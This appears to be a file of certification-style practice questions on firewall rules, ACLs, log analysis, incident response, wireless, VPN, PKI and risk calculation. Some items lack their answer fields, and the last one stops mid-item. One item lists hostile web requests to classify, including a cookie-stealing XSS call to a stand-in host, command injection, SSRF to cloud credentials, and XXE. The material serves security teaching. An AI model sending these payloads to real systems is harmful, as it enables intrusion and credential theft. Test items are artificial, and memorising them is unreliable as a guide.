scenario: You are configuring the edge firewall for a company that hosts its public services in a screened subnet. The firewall applies one rule list to all traffic, top to bottom, first match wins.
exhibit:
Internet ── [FW-EDGE] ──┬── DMZ 172.16.10.0/24
                        │     WEB01   172.16.10.10   public website, HTTPS only
                        │     MAIL01  172.16.10.25   inbound mail relay
                        │     DNS01   172.16.10.53   authoritative public DNS
                        │
                        └── LAN 10.10.0.0/16
                              DB01    10.10.5.20     SQL Server (TCP 1433)
                              ADMIN   10.10.99.0/24  administrator jump hosts
stem: Complete the rule table so that it meets every requirement and follows least privilege.
requirements: Anyone on the internet can reach the public website, but only over an encrypted connection.
Other mail servers on the internet can deliver email to MAIL01.
Anyone on the internet can resolve names from DNS01. Zone transfers must not be possible from the internet.
WEB01 can query the database on DB01. No other DMZ server can.
Administrators can manage every DMZ server, but only from the jump host subnet and only with an encrypted shell.
Everything else is blocked.

rows.why: HTTPS is TCP 443 and the destination is the single web server, not the whole DMZ. Port 80 would allow unencrypted HTTP, which the requirement rules out.
Mail servers relay to each other on SMTP, TCP 25. Port 587 is message submission from email clients, not server-to-server delivery.
Ordinary DNS queries use UDP 53. Zone transfers use TCP 53, so allowing only UDP serves lookups while keeping zone transfers closed. Choosing Any or TCP would expose the zone transfer.
Only WEB01 needs the database, so the source is its single address, not the DMZ subnet. SQL Server listens on TCP 1433, which the exhibit states.

SSH (TCP 22) is the encrypted shell, the jump host subnet is the only permitted source, and the destination is the whole DMZ because every server must be manageable. RDP (3389) is not a shell, and a source of 10.10.0.0/16 would let every internal host in.
The cleanup rule denies everything the earlier rules did not allow. It must be last, because a deny any any placed higher would block the allowed traffic below it.

takeaway: Firewall PBQs are won on precision: single host versus subnet, TCP versus UDP (DNS queries on UDP 53, zone transfers on TCP 53), and the exact service port (25 for relay, 587 for submission).

scenario: A branch office (192.168.50.0/24) connects to headquarters (10.1.0.0/16) over a site-to-site VPN. You are writing the rules on the headquarters firewall for traffic arriving from the branch. The branch guest Wi-Fi uses the upper half of the branch range.
exhibit:
Branch 192.168.50.0/24
  Guest Wi-Fi  192.168.50.128/25
  PRINT01      192.168.50.20   print server

Headquarters 10.1.0.0/16
  DC01   10.1.1.10   domain controller (Kerberos, LDAP)
  FS01   10.1.1.15   file server
  SIEM   10.1.2.50   log collector, accepts syslog over TLS only
stem: Complete the rule table. Rules are processed top to bottom, first match wins.
requirements: Nothing from the branch guest Wi-Fi may reach any headquarters system.
Branch devices can open shares on FS01.
Branch devices can authenticate to DC01 with Kerberos.
Branch devices can query the directory on DC01 over encrypted LDAP.
PRINT01 can send its logs to the SIEM.
All other traffic from the branch is blocked.

rows.why: The guest range sits inside the branch /24, so its deny has to come first. If the broader branch allows came first, guest devices would match them and get in.
Modern SMB file sharing runs directly over TCP 445. Port 139 is legacy NetBIOS session service. Guests already hit rule 1, so the /24 source is safe here.
Kerberos uses port 88 over both UDP and TCP (TCP for larger tickets). Allowing Any protocol would also open ICMP and everything else to the domain controller on that port number.
LDAPS (LDAP over TLS) is TCP 636. Port 389 is plain LDAP and 3268 is the global catalog, neither of which meets the encrypted requirement.

The SIEM accepts syslog over TLS only, which is TCP 6514. Classic syslog on UDP 514 is unencrypted and would be refused by the collector anyway. Only the print server needs this, so the source is its single address.
A final deny for the whole branch range blocks everything not allowed above it.

takeaway: When one range sits inside another, put the more specific rule first. Then know your secure ports: SMB 445, Kerberos 88 (TCP and UDP), LDAPS 636, syslog over TLS 6514.

scenario: A help desk ticket says an administrator at 10.20.30.15 cannot SSH to a server even though a rule permits it. You are given the access control list applied inbound on the server VLAN interface.
exhibit:
#  Action  Proto  Source           Destination     Port
 1  permit  tcp    10.20.0.0/16     10.50.1.10      443
 2  deny    tcp    10.20.30.0/24    10.50.1.0/24    any
 3  permit  tcp    10.20.30.15      10.50.1.20      22
 4  permit  udp    any              10.50.1.53      53
 5  deny    ip     10.20.0.0/16     10.50.1.0/24    any
 6  permit  ip     10.99.0.0/24     10.50.1.0/24    any
    (implicit deny ip any any)
stem: Trace each connection attempt through the ACL and choose the outcome and the rule that decides it.

prompts.label: 10.20.30.15 to 10.50.1.20, TCP 22 (the administrator's SSH)
prompts.why: Rule 1 does not match because the destination is not 10.50.1.10. Rule 2 matches: the source is inside 10.20.30.0/24, the destination is inside 10.50.1.0/24 and it is TCP. Rule 3 is never reached, so it is shadowed. The fix is to move rule 3 above rule 2.

prompts.label: 10.20.30.15 to 10.50.1.10, TCP 443
prompts.why: Rule 1 matches first: 10.20.30.15 is inside 10.20.0.0/16 and the destination and port match. The deny in rule 2 is never evaluated for this packet.

prompts.label: 10.20.30.15 to 10.50.1.53, UDP 53
prompts.why: Rule 2 only denies TCP, so this UDP query falls through to rule 4, which permits UDP 53 to the DNS server from any source.

prompts.label: 10.20.44.7 to 10.50.1.53, TCP 53 (a zone transfer attempt)
prompts.why: Rule 2 does not match because 10.20.44.7 is outside 10.20.30.0/24. Rule 4 only permits UDP. Rule 5 denies all IP traffic from 10.20.0.0/16 to the server subnet, so the TCP zone transfer stops there.

prompts.label: 10.99.0.8 to 10.50.1.20, TCP 3389
prompts.why: None of rules 1 to 5 match a 10.99.0.0/24 source, and rule 6 permits all IP traffic from that subnet to the server VLAN, including RDP.

prompts.label: 172.16.4.4 to 10.50.1.10, TCP 443
prompts.why: Rule 1 only permits sources in 10.20.0.0/16, rule 4 is UDP, and rules 5 and 6 do not match this source. With no explicit match, the implicit deny at the end drops it.

takeaway: Read an ACL like the device does: check every field of each rule in order and stop at the first full match. A specific permit placed below a broader deny is shadowed and never works.

scenario: Your SIEM raised several alerts overnight. Each excerpt below comes from a different data source.
stem: Identify the activity that each excerpt shows.

prompts.label:
Firewall: DENY TCP 198.51.100.7:51234 → 10.0.0.5:21
DENY TCP 198.51.100.7:51235 → 10.0.0.5:22
DENY TCP 198.51.100.7:51236 → 10.0.0.5:23
…1,020 more, one per destination port, within 3 seconds
prompts.why: One source touching sequential destination ports on one host in seconds is a port scan, the reconnaissance step that maps which services are listening.

prompts.label:
sshd: Failed password for root from 203.0.113.9 (1,840 times in 9 minutes)
sshd: Accepted password for root from 203.0.113.9
prompts.why: Many guesses against one account from one source is brute force, and the final Accepted line means it worked. Treat the host as compromised, not just attacked.

prompts.label: Identity provider: password 'Autumn2026!' tried once against each of 914 different accounts from one IP, no lockouts
prompts.why: One common password tried once per account across many accounts, staying under the lockout threshold, is password spraying rather than brute force against a single account.

prompts.label: DNS logs: host 10.0.4.17 sent 11,900 TXT queries in one hour, each to a different random subdomain such as mzxw6ytbojrwy3dp.cdn-sync.example
prompts.why: Huge numbers of unique, encoded-looking subdomains under one domain, often with TXT records, are how DNS tunneling smuggles data out through a protocol firewalls usually allow.

prompts.label: Proxy: 10.0.7.33 → 185.220.101.4:443 every 60 s (±2 s), 512 bytes out and 128 bytes in, all night, user logged off
prompts.why: Small, regular, automated connections at a fixed interval with nobody logged in are beaconing: malware checking in with its C2 server for instructions.

prompts.label: Edge router: 2 Gbps of UDP 53 responses arriving at 10.0.0.9 from 4,800 different resolvers; 10.0.0.9 sent no DNS queries
prompts.why: Large DNS responses the victim never asked for, from thousands of open resolvers, mean an attacker spoofed the victim's address in small queries. The resolvers reflect and amplify the traffic.

prompts.label: VPN: user jsmith signed in from Chicago at 09:02 and from Singapore at 09:20 the same day
prompts.why: Nobody can travel between those cities in 18 minutes, so the two sign-ins cannot both be the real user. It points to stolen credentials or a shared session.

takeaway: Most log PBQs hinge on the pattern, not the protocol: one source and many ports is a scan, one password and many accounts is spraying, fixed-interval tiny connections are beaconing.

scenario: A compromised Linux server is still running. You have been authorized to collect evidence before it is rebuilt, and you must follow the order of volatility.
stem: Put the evidence sources in the order you should collect them, most volatile first.

items.text: CPU registers and processor cache
items.why: Registers and cache change with every instruction, so they are the most volatile and are captured first (in practice, as part of a live response).

items.text: Routing table, ARP cache, process table and the rest of RAM
items.why: Memory holds running processes, network connections and decrypted keys, and it disappears at power-off. Capture it right after the CPU state.

items.text: Temporary file systems and swap space
items.why: /tmp and swap survive longer than RAM but are routinely overwritten or cleared at reboot, so they come next.

items.text: Data on the local disk
items.why: Disk contents persist through power loss, so a forensic image (taken with a write blocker and hashed) can wait until the volatile data is safe.

items.text: Remote logs and monitoring data on the SIEM
items.why: Logs already shipped off the host are not affected by anything on the server, but they still rotate out on a retention schedule, so they come before archives.

items.text: Archived backups on offline media
items.why: Offline backups change least of all and are the least volatile source, so they are collected last.

takeaway: Order of volatility (RFC 3227): registers and cache, memory, temporary file systems, disk, remote logs, then archival media. Collect what disappears first.

scenario: EDR alerts show ransomware encrypting shares on a file server. Investigators later find the attacker entered through an unpatched VPN appliance using a stolen account.
stem: Put the response actions in the order the incident response process calls for.

items.text: Correlate the EDR alert with file server and VPN logs to confirm the incident and its scope
items.why: Detection and analysis come first: you confirm it is real and work out which systems and accounts are involved before acting.

items.text: Disconnect the file server from the network and disable the stolen account
items.why: Containment stops the spread. Isolating the server, rather than powering it off, keeps memory evidence intact.

items.text: Capture memory and image the server's disk, recording the chain of custody
items.why: Evidence is preserved before anything is removed or rebuilt, because eradication destroys the artifacts investigators need.

items.text: Remove the ransomware and its persistence, and patch the VPN appliance
items.why: Eradication removes the cause, including the entry point. Restoring before patching the VPN would let the attacker straight back in.

items.text: Restore the shares from clean offline backups and monitor closely
items.why: Recovery brings services back from known-good copies, with extra monitoring in case anything was missed.

items.text: Hold a lessons-learned review and update the ransomware playbook
items.why: The post-incident review is last, once the facts are in, and its output improves the preparation phase for next time.

takeaway: Analyze, contain, preserve evidence, eradicate (including the entry point), recover, then learn. Fixing the root cause before restoring is the step people most often put in the wrong place.

scenario: A hospital is replacing its wireless network. Requirements: staff devices are company managed and must authenticate with individual credentials but no passwords; guests need internet access only and must not see each other; the network must resist evil twin and deauthentication attacks; nothing may be configurable by pressing a button on an access point.
stem: Choose the setting for each item.

prompts.label: Security mode
prompts.why: Individual credentials require Enterprise mode (802.1X). Personal mode uses one shared passphrase for everyone, and WEP and open networks are not acceptable for staff.

prompts.label: EAP method
prompts.why: EAP-TLS authenticates each managed device with its own certificate, so there is no password at all. PEAP and EAP-TTLS still rely on passwords inside the tunnel, and LEAP is broken.

prompts.label: Authentication server
choices: LDAP directory queried directly by the access points
Local user list on each access point
prompts.why: 802.1X access points act as authenticators and pass EAP to a RADIUS server. TACACS+ is for device administration, and access points do not speak EAP to LDAP or Kerberos directly.

prompts.label: Protected Management Frames (802.11w)
prompts.why: Forged deauthentication frames only work because management frames were unauthenticated. Required PMF blocks them, and WPA3 mandates it anyway. Optional would let older clients connect without protection.

prompts.label: Encryption
choices: WPA2-Personal with the passphrase posted in the lobby
prompts.why: OWE encrypts each guest's traffic without a shared password, and client isolation stops guests reaching each other. A posted WPA2 passphrase lets anyone who knows it decrypt other guests' traffic.

prompts.label: Network placement
choices: Server VLAN behind the internal firewall
prompts.why: Guests are untrusted, so they get their own VLAN that is routed only to the internet, never to internal subnets.

prompts.label: Wi-Fi Protected Setup (WPS)
prompts.why: The requirement bans configuration by button press, and WPS PIN mode can be brute-forced to reveal the passphrase. Disable it entirely.

prompts.label: Rogue and evil twin detection
prompts.why: A WIPS watches the airwaves for rogue and look-alike access points and can contain them. Hidden SSIDs and MAC filters are easily bypassed, and lower power only shrinks coverage.

takeaway: Certificates and no passwords means EAP-TLS over WPA3-Enterprise with RADIUS. Guests get OWE plus isolation on their own VLAN. PMF required stops deauth, WPS off, WIPS for evil twins.

scenario: A site-to-site VPN between headquarters and a new branch will not come up. Policy bans 3DES, MD5, SHA-1, DH groups 1, 2 and 5, IKEv1 aggressive mode and pre-shared keys, and requires the original IP headers of branch traffic to be hidden in transit.
exhibit:
HQ gateway (correct, do not change)
  IKE version ............ IKEv2
  Authentication ......... Certificates
  Encryption ............. AES-256-GCM
  PRF / integrity ........ SHA-384
  DH group ............... 20 (ECP-384)
  IPsec protocol ......... ESP
  Mode ................... Tunnel
  Perfect forward secrecy  Group 20

Branch gateway (current)
  IKEv1 aggressive, pre-shared key, 3DES, SHA-1, DH group 2,
  AH, transport mode, PFS off
stem: Choose the branch gateway setting for each item so that the tunnel comes up and meets policy.

prompts.label: IKE version
prompts.why: Both ends must speak the same IKE version, and HQ runs IKEv2. Aggressive mode is banned because it exposes the identity and hash in the clear.

prompts.label: Authentication
prompts.why: Pre-shared keys are banned and HQ authenticates with certificates, so the branch needs a certificate from the same trusted CA.

prompts.label: Encryption
prompts.why: The proposal must match HQ exactly. AES-256-GCM is also authenticated encryption, while 3DES and RC4 are deprecated.

prompts.label: PRF / integrity
prompts.why: MD5 and SHA-1 are banned, and SHA-384 matches HQ.

prompts.label: Diffie-Hellman group
prompts.why: Groups 2 and 5 are banned. Group 14 is allowed by policy but does not match HQ's group 20, so negotiation would fail.

prompts.label: IPsec protocol
prompts.why: AH only authenticates and provides no confidentiality, and it breaks through NAT. ESP encrypts the payload and matches HQ.

prompts.label: Mode
prompts.why: Hiding the original IP headers requires tunnel mode, which encapsulates the whole original packet. Transport mode protects only the payload and is meant for host-to-host use.

prompts.label: Perfect forward secrecy
prompts.why: PFS gives each Phase 2 key its own fresh Diffie-Hellman exchange, so one stolen key does not expose other sessions. It must match HQ's group 20.

takeaway: IPsec tunnels fail on any mismatch, so copy the working side exactly. Then check policy: ESP over AH for confidentiality, tunnel mode to hide headers, PFS on, no SHA-1, MD5, 3DES or low DH groups.

scenario: You are adding security devices to the network below.
exhibit:
Internet ── [Edge firewall] ──┬── Screened subnet: public web farm, mail relay
                              │
                       [Internal firewall]
                              │
                        [Core switch] ──┬── User VLAN (desktops, laptops)
                                        ├── Server VLAN (file, database, SIEM)
                                        └── Management VLAN (switch and server consoles)
stem: Choose where each device belongs.
choices: Inline in the screened subnet, in front of the web farm
Screened subnet, alongside the public servers
Passive tap on the core link between users and servers
Inline between the core switch and the server VLAN

prompts.label: Web application firewall that must inspect and block malicious HTTP requests before they reach the web servers
prompts.answer: Inline in the screened subnet, in front of the web farm
prompts.why: A WAF has to sit in the traffic path in front of the web servers it protects. Out of line it could only watch, and outside the edge firewall it would also face non-web noise it cannot parse.

prompts.label: Network IDS sensor that must see traffic between users and servers without any chance of disrupting it
prompts.answer: Passive tap on the core link between users and servers
prompts.why: A tap copies traffic passively, so the sensor sees east-west traffic but cannot drop or delay it. Placing it inline would make it a potential point of failure.

prompts.label: Network IPS that must block exploit traffic aimed at the internal servers
prompts.answer: Inline between the core switch and the server VLAN
prompts.why: Prevention means dropping packets, which is only possible inline in front of what it protects. A tap or a mirror port can only alert.

prompts.label: Jump server that administrators must pass through to reach switch and server consoles
prompts.why: The jump host is the controlled gateway into the management network, so it lives there and is the only system allowed to reach the consoles.

prompts.label: VPN concentrator for remote employees
prompts.answer: Screened subnet, alongside the public servers
prompts.why: It must be reachable from the internet but should not sit on the internal network, so the screened subnet lets the internal firewall still filter what remote users can reach.

prompts.label: Honeypot meant to attract attackers probing the company's public services
prompts.answer: Screened subnet, alongside the public servers
prompts.why: A decoy that looks like a public server belongs next to the real public servers, where external attackers will find it, and away from internal data.

prompts.label: SIEM log collector that every segment sends logs to
prompts.why: The collector is an internal server that all segments can reach through the internal firewall, but it should never be exposed to the internet.

takeaway: Prevention devices (WAF, IPS) go inline in front of what they protect; detection devices (IDS) go on a tap or span; anything internet-facing but not public data goes in the screened subnet.

scenario: The PKI team has a list of requests from around the company.
stem: Choose the certificate type or PKI feature that BEST meets each request.
choices: Certificate from the internal CA, with its root pushed to all clients
Offline root CA with an online issuing CA

prompts.label: One certificate must cover example.com, shop.example.com and api.example.net
prompts.why: Subject Alternative Name entries list several unrelated names in one certificate. A wildcard only covers one level under a single domain, so it cannot cover api.example.net.

prompts.label: Developers spin up hundreds of short-lived hosts named <anything>.dev.example.com
prompts.why: *.dev.example.com covers any single label under dev.example.com without reissuing for each new host.

prompts.label: Endpoints must refuse to run PowerShell scripts that IT has not approved
prompts.why: Signing scripts with a code signing certificate lets endpoints enforce an AllSigned policy and detect any script altered after signing.

prompts.label: Employees get browser warnings on the intranet site because the web server issued its own certificate
prompts.answer: Certificate from the internal CA, with its root pushed to all clients
prompts.why: The site needs a certificate from a CA the clients trust. An internal CA whose root is distributed by group policy fits an intranet; buying an EV certificate for an internal name is not possible.

prompts.label: Clients' revocation checks are slow and leak which sites users visit to the CA
prompts.why: With stapling the web server fetches its own signed OCSP response and hands it to clients in the TLS handshake, so clients do not contact the CA at all.

prompts.label: The banking app must reject a valid-looking certificate issued by a compromised public CA
prompts.why: Pinning makes the app accept only the expected certificate or public key, so even a certificate from a trusted but compromised CA is refused.

prompts.label: Lawyers must digitally sign and encrypt email to clients
prompts.why: S/MIME certificates are issued to a person's email address and support both signing and encrypting messages.

prompts.label: The CA's signing key must stay safe even if an online server is compromised
prompts.answer: Offline root CA with an online issuing CA
prompts.why: Keeping the root offline and issuing day-to-day certificates from an intermediate means a compromise only requires revoking the intermediate, not rebuilding the whole chain of trust.

takeaway: SAN covers a list of different names, wildcard covers one level of one domain, stapling fixes revocation privacy and speed, pinning beats compromised CAs, and an offline root protects the trust anchor.

scenario: A distribution warehouse and its contents are valued at $800,000. A serious flood would destroy 25% of that value. The area floods badly about once every 20 years. A flood barrier costs $15,000 per year to lease and maintain, and would reduce serious floods to about once every 100 years.
stem: Calculate each value and make the decision.

prompts.label: Single loss expectancy (SLE)
prompts.why: SLE = asset value x exposure factor = $800,000 x 0.25 = $200,000.

prompts.label: Annualized rate of occurrence (ARO) today
prompts.why: Once every 20 years is 1/20 = 0.05 per year. The 20 itself is the interval, not the rate.

prompts.label: Annualized loss expectancy (ALE) today
prompts.why: ALE = SLE x ARO = $200,000 x 0.05 = $10,000 per year.

prompts.label: ALE with the barrier
prompts.why: The barrier changes the ARO to 1/100 = 0.01, so ALE = $200,000 x 0.01 = $2,000.

prompts.label: Yearly value of the barrier (ALE reduction minus its yearly cost)
prompts.why: It saves $10,000 minus $2,000 = $8,000 of expected loss but costs $15,000, a net of minus $7,000 per year.

prompts.label: Decision
choices: Lease the barrier, because it lowers the ALE
Do not lease the barrier; it costs more than the loss it prevents
Avoid the risk by moving the warehouse immediately
prompts.answer: Do not lease the barrier; it costs more than the loss it prevents
prompts.why: A control should cost less than the reduction in expected loss it buys. Here it costs $7,000 a year more than it saves, so accepting or transferring the risk (flood insurance) is the rational response.

takeaway: SLE = AV x EF, ARO = 1 / years between events, ALE = SLE x ARO, and a safeguard is worth it only if the ALE reduction exceeds its annual cost.

scenario: The WAF on a customer portal recorded the requests below over one afternoon.
stem: Identify the attack each request shows.

prompts.label: GET /search?q=<script>new Image().src='https://x.example/c?'+document.cookie</script>
prompts.why: Script in a parameter that the page echoes back runs in the victim's browser and here steals the session cookie. That is reflected XSS.

prompts.label: GET /item?id=7 UNION SELECT username,password_hash FROM users
prompts.why: Appending a UNION SELECT to a numeric parameter tries to make the database return another table, which is SQL injection.

prompts.label: GET /download?file=..%2f..%2f..%2fetc%2fshadow
prompts.why: Encoded ../ sequences climb out of the intended folder to read a system file, which is directory (path) traversal.

prompts.label: POST /tools/ping   host=8.8.8.8;cat /etc/passwd
prompts.why: The semicolon ends the ping command and starts a second shell command, which is OS command injection.

prompts.label: GET /preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
prompts.why: The server is tricked into fetching an internal address, here the cloud metadata service that hands out credentials. That is SSRF.

prompts.label: POST /upload  <!DOCTYPE x [<!ENTITY f SYSTEM "file:///etc/hosts">]><order>&f;</order>
prompts.why: A DOCTYPE that defines an external entity pointing at a local file makes a vulnerable XML parser read the file into the response, which is XXE.

prompts.label: GET /people?user=*)(objectClass=*
prompts.why: The *)( characters close one LDAP filter and open another that matches every object, so the directory returns far more than intended.

takeaway: Learn each injection's fingerprint: <script> is XSS, UNION or ' OR is SQL, ../ is traversal, ; or | is command injection, an internal URL is SSRF, <!ENTITY is XXE, *)( is LDAP.

scenario: An identity team is choosing protocols for several projects.
stem: Choose the protocol that BEST fits each requirement.

prompts.label: Employees sign in once to the corporate identity provider and reach a third-party payroll site, which receives a signed XML assertion
prompts.why: Signed XML assertions from an identity provider to a service provider are SAML web single sign-on.

prompts.label: A new mobile app must sign users in with their existing social or corporate account and receive an ID token describing who they are
prompts.why: OIDC adds authentication and a JSON ID token on top of OAuth 2.0, which is what modern web and mobile sign-in uses.

prompts.label: A photo printing site needs permission to read a user's cloud photo album without ever learning the user's password
prompts.why: This is delegated authorization: the user grants a scoped access token. OAuth by itself does not prove identity to the app, and none is needed here.

prompts.label: Network engineers' logins to routers must be authorized command by command, with the whole session encrypted and logged
prompts.why: TACACS+ separates authentication, authorization and accounting, supports per-command authorization and encrypts the entire payload.

prompts.label: Wireless access points must check staff credentials during 802.1X authentication
prompts.why: 802.1X authenticators forward EAP to a RADIUS server. RADIUS is built for network access, not for authorizing individual device commands.

prompts.label: Domain-joined Windows clients must reach file shares without sending the password over the network, using time-limited tickets
prompts.why: Kerberos issues a ticket-granting ticket and then service tickets, so the password is never sent to the file server. Clock skew breaks it.

prompts.label: An HR application must look up employees' department and manager in the directory over an encrypted connection
prompts.why: Directory queries use LDAP, and LDAPS wraps them in TLS on port 636. The other protocols do not query directory attributes.

takeaway: SAML is XML assertions, OIDC is OAuth plus an ID token for sign-in, OAuth alone is delegated access, RADIUS is network access, TACACS+ is device admin per command, Kerberos is tickets inside a domain, LDAPS is encrypted directory lookups.

scenario: After malware on a workstation tunneled data out over DNS and sent spam directly to the internet, the company is adding egress filtering. FW-CORE sits between every internal segment and the internet and applies one rule list to all traffic, top to bottom, first match wins.
exhibit:
Internet ── [FW-CORE] ──┬── STAFF    10.30.10.0/24   user workstations
                         │
                         └── SERVERS  10.30.50.0/24
                               DNS01   10.30.50.53    internal DNS resolver
                               NTP01   10.30.50.123   internal time server
                               SMTP01  10.30.50.25    outbound mail relay
stem: Complete the rule table so that it meets every requirement and follows least privilege.
requirements: Staff can browse the web, but only over encrypted connections.
Staff can resolve names, but only by asking DNS01.
DNS01 is the only host that may query DNS servers on the internet. Large answers must still work.
NTP01 is the only host that may synchronize time with internet time servers.
SMTP01 is the only host that may deliver mail to other mail servers on the internet.
Everything else is blocked.

rows.why: HTTPS is TCP 443 from the staff subnet. Allowing port 80 as well would permit unencrypted browsing, which the requirement rules out.
Workstations may only reach DNS01 on port 53, never outside resolvers, which is what defeats DNS tunneling straight from a workstation. DNS uses UDP and falls back to TCP, so the protocol is Any.

Only the resolver talks DNS to the internet. Large responses and truncated answers retry over TCP 53, so allowing only UDP would break some lookups; that is why the requirement mentions large answers.
NTP runs on UDP 123. Pinning the source to NTP01 means workstations sync from the internal server instead of reaching out themselves.
Server to server mail delivery is SMTP on TCP 25. Limiting it to SMTP01 stops infected workstations from sending spam directly. Port 587 is for clients submitting mail, not relay to other servers.
The cleanup rule blocks every other outbound connection, including workstations trying to reach outside DNS, mail or time servers themselves.

takeaway: Egress filtering matters as much as ingress: force DNS, mail and time through designated servers, so malware on a workstation cannot tunnel or spam straight out.

scenario: You are writing the rules on the perimeter firewall for remote access and a supplier connection. The firewall applies one rule list to all traffic, top to bottom, first match wins.
exhibit:
Internet ── [FW-EDGE] ──┬── EDGE 172.20.0.0/24
                         │     VPN01   172.20.0.5    IPsec VPN gateway
                         │     SFTP01  172.20.0.20   file drop for suppliers
                         │
                         └── LAN 10.40.0.0/16
                               APP01   10.40.1.15    internal web app (HTTPS)

Supplier network:        198.51.100.0/24
VPN client address pool: 10.99.0.0/24
Threat feed alert:       203.0.113.66 is probing VPN01
stem: Complete the rule table. Rules are processed top to bottom, first match wins.
requirements: Block 203.0.113.66 from reaching anything, including services that later rules allow.
Remote users can negotiate IPsec security associations with VPN01 using IKE.
Most remote users sit behind home routers that use NAT, so the encrypted tunnel traffic must be allowed using NAT traversal.
Only the supplier's network can upload files to SFTP01.
Remote users, once connected, can reach APP01 over HTTPS and nothing else on the LAN.
Everything else is blocked.

rows.why: First match wins, so a block meant to override later allows has to sit above them. If it came after the IKE rule, the attacker's probes to VPN01 would match the allow first.
IKE, which negotiates the IPsec security associations, runs on UDP 500. Remote users can be anywhere, so the source is Any, but the destination is only the VPN gateway.
NAT traversal wraps the ESP tunnel in UDP 4500 so it survives home routers doing NAT. Without it, IKE succeeds but no tunnel traffic flows. UDP 1701 is L2TP, a different protocol.
SFTP runs over SSH on TCP 22, and only the supplier's range is allowed. Ports 21 and 990 are FTP and FTPS, which are different protocols from SFTP.
Traffic from connected VPN users arrives from the client address pool. Allowing only HTTPS to the single app server keeps a stolen VPN login from reaching the rest of the LAN.
The cleanup rule denies everything not explicitly allowed above, including VPN users trying to reach other LAN hosts.

takeaway: Put specific denies above the allows they must override. IPsec needs UDP 500 (IKE) and UDP 4500 (NAT traversal); SFTP is TCP 22, not the FTP ports.

scenario: A three-tier web application runs in a cloud virtual network, with one subnet per tier. The provider's network firewall policy is stateful, so replies to allowed connections pass automatically, and it evaluates rules top to bottom, first match wins.
exhibit:
Internet ── [Cloud firewall policy] ──┬── PUBLIC  10.0.1.0/24
                                      │     LB01     10.0.1.10   load balancer, terminates HTTPS
                                      │
                                      ├── APP     10.0.2.0/24   app servers, listen on TCP 8443
                                      │
                                      ├── DATA    10.0.3.0/24
                                      │     DB01     10.0.3.20   PostgreSQL (TCP 5432)
                                      │     VAULT01  10.0.3.40   backup vault
                                      │
                                      └── MGMT    10.0.0.0/24
                                            BAST01   10.0.0.10   bastion host
                                            REPO01   10.0.0.30   internal patch mirror (HTTPS)
stem: Complete the rule table so that it meets every requirement and follows least privilege.
requirements: Anyone on the internet can reach the load balancer over HTTPS.
Only the load balancer can send requests to the app servers.
The app servers can query the database. Nothing else in the data tier is reachable from them.
Administrators reach the app servers only through the bastion host, using SSH.
The app servers can download operating system patches from the internal patch mirror over HTTPS.
Everything else is blocked.

rows.why: Users can be anywhere, so the source is Any, but the destination is only the load balancer. The app servers themselves are never exposed to the internet.
The load balancer is a single host, so its address is the source rather than the whole public subnet. The app servers listen on TCP 8443, which the exhibit states, not on 443.
PostgreSQL listens on TCP 5432. The destination is DB01 alone, not the data subnet, so a compromised app server cannot reach the backup vault. Ports 1433 and 3306 are SQL Server and MySQL.
SSH is TCP 22 and the only permitted source is the bastion host itself. Allowing the whole management subnet would let any other host placed there skip the bastion.

The app servers start the download, so they are the source and REPO01 alone is the destination. HTTPS to Any would also open the backup vault and every other tier on 443, breaking the data tier requirement. Because the policy is stateful, the downloads come back without an inbound rule.
The cleanup rule blocks everything not allowed above, including internet traffic aimed straight at the app or data tiers.

takeaway: Tier the rules: internet to load balancer, load balancer to app, app to one database port, admin only from the bastion, patches only from the mirror. A stateless network ACL would also need rules for return traffic on ephemeral ports; a stateful security group or policy does not.

scenario: A manufacturer is segmenting its plant network. An internal firewall routes between all four VLANs, is stateful, and applies one rule list top to bottom, first match wins. Operators want the PLCs reachable only for programming from one workstation.
exhibit:
USERS    10.20.10.0/24   staff workstations
  ENG01    10.20.10.77   engineering workstation (PLC programming software)

SERVERS  10.20.20.0/24
  NTP01    10.20.20.10   time server
  HIST01   10.20.20.30   process historian, accepts OPC UA on TCP 4840
  NVR01    10.20.20.40   video recorder, accepts RTSP on TCP 554

OT       10.20.30.0/24
  PLC01 to PLC12        Modbus TCP on port 502
  HMI01    10.20.30.5    operator panel, web interface on TCP 443

IOT      10.20.40.0/24   IP cameras
stem: Complete the rule table so that it meets every requirement and follows least privilege.
requirements: ENG01 is the only user device that can program the PLCs.
No other device in the user VLAN can reach anything in the OT VLAN.
HMI01 can publish process data to the historian.
OT devices can synchronize their clocks with NTP01.
User devices can reach web applications anywhere, internal or on the internet, over HTTPS.
The cameras can stream video to the recorder.
Everything else is blocked, including any other traffic from the cameras.

rows.why: Only ENG01 may program the PLCs, so its single address is the source. The twelve PLCs share the OT subnet, so the /24 is the narrowest destination offered, and only Modbus TCP 502 is opened.
This deny must sit below the ENG01 allow, which it would otherwise shadow, and above the HTTPS allow in rule 5, whose Any destination would otherwise let every user reach the HMI web interface.
Only the HMI publishes to the historian, so the source is one host and the destination is one host. OPC UA on TCP 4840 comes from the exhibit.
NTP runs over UDP 123. Every OT device needs time, so the source is the OT subnet, and the destination is NTP01 alone rather than the whole server VLAN.
The requirement covers internal and internet web apps, so the destination is Any on TCP 443. It is safe only because rule 2 already stopped user traffic to the OT VLAN.
The cameras stream RTSP on TCP 554 to the recorder only. IoT devices are weakly secured, so they get exactly one destination and one port.
The cleanup rule blocks everything else, including cameras trying to reach the OT VLAN or the internet.

takeaway: Order matters in both directions: a single-host allow goes above the subnet deny it is an exception to, and that deny goes above any broad allow (such as HTTPS to Any) that would otherwise reach the protected segment.

scenario: A retailer must keep its cardholder data environment (CDE) isolated to reduce PCI DSS scope. The core firewall connects stores, the corporate network, the CDE and the internet, is stateful, and processes one rule list top to bottom, first match wins.
exhibit:
STORES   10.70.0.0/16    point-of-sale terminals
CORP     10.60.0.0/16    corporate users and servers
  JUMP01   10.60.9.5     jump host with MFA

CDE-APP  10.50.0.0/24
  PAYAPI   10.50.0.10    payment API (HTTPS)
CDE-DB   10.50.1.0/24
  CARDDB   10.50.1.20    SQL Server (TCP 1433)

Payment processor gateway (internet): 203.0.113.80, HTTPS
stem: Complete the rule table so that it meets every requirement and follows least privilege.
requirements: Store terminals can submit transactions to the payment API.
Only the payment API can query the cardholder database.
The payment API can send authorization requests to the payment processor, and to no other internet host.
Administrators manage every CDE server over RDP, but only from JUMP01.
No other corporate system can reach the CDE.
Corporate users can browse the internet over HTTPS.
Everything else is blocked.

rows.why: The terminals talk only to the payment API over HTTPS, so the destination is that one host, not the CDE ranges.
Only PAYAPI may query the database, so the source is its address rather than the CDE-APP subnet. SQL Server is TCP 1433; 3306 is MySQL.
